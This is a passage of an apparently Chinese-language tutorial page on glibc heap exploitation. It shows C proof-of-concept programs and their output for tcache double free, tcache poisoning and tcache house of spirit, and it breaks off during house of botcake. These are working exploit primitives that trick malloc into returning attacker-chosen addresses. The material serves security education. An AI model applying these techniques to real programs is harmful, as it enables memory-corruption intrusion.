</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates a simple double-free attack with tcache.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating buffer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing twice...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p, %p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Next allocated buffers will be same: [%p, %p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>),</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates a simple double-free attack with tcache.
</span></span><span class=line><span class=cl>Allocating buffer.
</span></span><span class=line><span class=cl>malloc(8): 0x1a90260
</span></span><span class=line><span class=cl>Freeing twice...
</span></span><span class=line><span class=cl>Now the free list has [0x1a90260, 0x1a90260].
</span></span><span class=line><span class=cl>Next allocated buffers will be same: [0x1a90260, 0x1a90260].
</span></span></code></pre></td></tr></table></div></div><p>和 fastbin 类似，tcache 也存在 double free，而且还没有链表头检查，因此只需要连续两次 free 就好了，更加简单。</p><h2 id=tcache_poisoning>tcache_poisoning</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	       <span class=s>&#34;returning a pointer to an arbitrary location (in this case, the stack).</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	       <span class=s>&#34;The attack is very similar to fastbin corruption attack.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The address we want malloc() to return is %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 1 buffer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>intptr_t</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(128): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the buffer...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the tcache list has [%p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We overwrite the first %lu bytes (fd/next pointer) of the data at %p</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;to point to the location to control (%p).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>intptr_t</span><span class=p>),</span> <span class=n>a</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(128): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the tcache list has [%p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>intptr_t</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(128): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We got the control</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates a simple tcache poisoning attack by tricking malloc into
</span></span><span class=line><span class=cl>returning a pointer to an arbitrary location (in this case, the stack).
</span></span><span class=line><span class=cl>The attack is very similar to fastbin corruption attack.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The address we want malloc() to return is 0x7ffd4941b420.
</span></span><span class=line><span class=cl>Allocating 1 buffer.
</span></span><span class=line><span class=cl>malloc(128): 0x1601260
</span></span><span class=line><span class=cl>Freeing the buffer...
</span></span><span class=line><span class=cl>Now the tcache list has [0x1601260].
</span></span><span class=line><span class=cl>We overwrite the first 8 bytes (fd/next pointer) of the data at 0x1601260
</span></span><span class=line><span class=cl>to point to the location to control (0x7ffd4941b420).
</span></span><span class=line><span class=cl>1st malloc(128): 0x1601260
</span></span><span class=line><span class=cl>Now the tcache list has [0x7ffd4941b420].
</span></span><span class=line><span class=cl>2nd malloc(128): 0x7ffd4941b420
</span></span><span class=line><span class=cl>We got the control
</span></span></code></pre></td></tr></table></div></div><p>和 <code>fastbin_dup_into_stack</code> 类似，改写已经 <code>free</code> 掉的 chunk 的 <code>fd</code> 指向栈上地址，然后 <code>malloc</code> 两次即可分配到栈上。</p><h2 id=tcache_house_of_spirit>tcache_house_of_spirit</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates the house of spirit attack on tcache.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;It works in a similar way to original house of spirit but you don&#39;t need to create fake chunk after the fake chunk that will be freed.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#39;s size and prev_inuse are sane.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;(Search for strings </span><span class=se>\&#34;</span><span class=s>invalid next size</span><span class=se>\&#34;</span><span class=s>and </span><span class=se>\&#34;</span><span class=s>double free or corruption</span><span class=se>\&#34;</span><span class=s>)</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Ok. Let&#39;s start with the example!.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Calling malloc() once so that it sets up its memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>a</span><span class=p>;</span> <span class=c1>//pointer that will be overwritten
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span> <span class=c1>//fake chunk region
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This region contains one fake chunk. It&#39;s size field is placed at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>;</span> <span class=c1>// this is the size
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the overwritten pointer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(0x30): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x30</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates the house of spirit attack on tcache.
</span></span><span class=line><span class=cl>It works in a similar way to original house of spirit but you don&#39;t need to create fake chunk after the fake chunk that will be freed.
</span></span><span class=line><span class=cl>You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#39;s size and prev_inuse are sane.
</span></span><span class=line><span class=cl>(Search for strings&#34;invalid next size&#34;and&#34;double free or corruption&#34;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ok. Let&#39;s start with the example!.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Calling malloc() once so that it sets up its memory.
</span></span><span class=line><span class=cl>Let&#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.
</span></span><span class=line><span class=cl>This region contains one fake chunk. It&#39;s size field is placed at 0x7ffe46748fb8
</span></span><span class=line><span class=cl>This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
</span></span><span class=line><span class=cl>... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
</span></span><span class=line><span class=cl>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe46748fb8.
</span></span><span class=line><span class=cl>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
</span></span><span class=line><span class=cl>Freeing the overwritten pointer.
</span></span><span class=line><span class=cl>Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, which will be 0x7ffe46748fc0!
</span></span><span class=line><span class=cl>malloc(0x30): 0x7ffe46748fc0
</span></span></code></pre></td></tr></table></div></div><p>依然非常简单。相比传统 house of spirit，tcache 中不会检查被释放的 chunk 的下一个 chunk 的 <code>chunk_size</code> 字段。那么我们只要保证 fake chunk 本身的大小合法（实际上就是位于 small bin 范围内）就可以了。随后将 fake chunk 的 <code>mem</code> 指针赋值给 <code>a</code>，<code>free(a)</code> 就将 fake chunk 放进了 tcache，再次 <code>malloc</code> 即可拿到 fake chunk。</p><h2 id=house_of_botcake>house_of_botcake</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * This attack should bypass the restriction introduced in
</span></span></span><span class=line><span class=cl><span class=cm>     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
</span></span></span><span class=line><span class=cl><span class=cm>     * If the libc does not include the restriction, you can simply double free the victim and do a
</span></span></span><span class=line><span class=cl><span class=cm>     * simple tcache poisoning
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// disable buffering and make _FILE_IO does not interfere with our heap
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// introduction
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;returning a pointer to an arbitrary location (in this demo, the stack).&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;This attack only relies on double free.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// prepare the target
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>intptr_t</span> <span class=n>stack_var</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;The address we want malloc() to return, namely,&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;the target address is %p.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// prepare heap layout
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Preparing heap layout&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>intptr_t</span> <span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=k>sizeof</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=n>intptr_t</span><span class=o>*</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
